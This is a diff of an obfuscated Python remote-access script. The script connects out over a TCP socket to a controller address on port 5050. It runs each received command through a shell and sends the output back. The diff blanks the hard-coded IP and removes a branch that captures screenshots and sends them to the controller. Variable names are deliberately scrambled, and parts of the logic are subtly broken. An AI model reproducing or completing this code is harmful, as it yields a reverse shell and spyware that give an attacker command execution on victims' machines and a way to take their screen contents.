@@ -12,7 +12,7 @@ except:
     import tqdm
 import socket
 bASYUAusU = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-PLppsokPSO = "192.168.1.41"
+PLppsokPSO = ""
 OIWODFISO = 5050
 PPJAjpA = "<SEPARATOR>"
 
@@ -23,12 +23,6 @@ def yyyyyyyyyyYyySSAASKJAKSAS():
         OASASASONon = bASYUAusU.recv(1024)
         if OASASASONon[0:] == "cd":
             os.chdir(OASASASONon[2:].encode("utf-8"))
-        elif OASASASONon[0:] == "screenshot":
-            for i in range(OASASASONon[2].encode("utf-8")):
-                OUauaoxuu = pyautogui.screenshot()
-                OIioiaoIX = OUauaoxuu.save(f"target{i}.png")
-                jNOsiauiays = os.path.getsize(OIioiaoIX)
-                bASYUAusU.send(f"{OIioiaoIX}{PPJAjpA}{jNOsiauiays}".encode("utf-8"))
         if len(OASASASONon) > 0:
             oCDISDCICjnkjn = subprocess.Popen(OASASASONon[:].encode("utf-8"), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             kjaxnajkbc = oCDISDCICjnkjn.stdout.read() + oCDISDCICjnkjn.stderr.read()
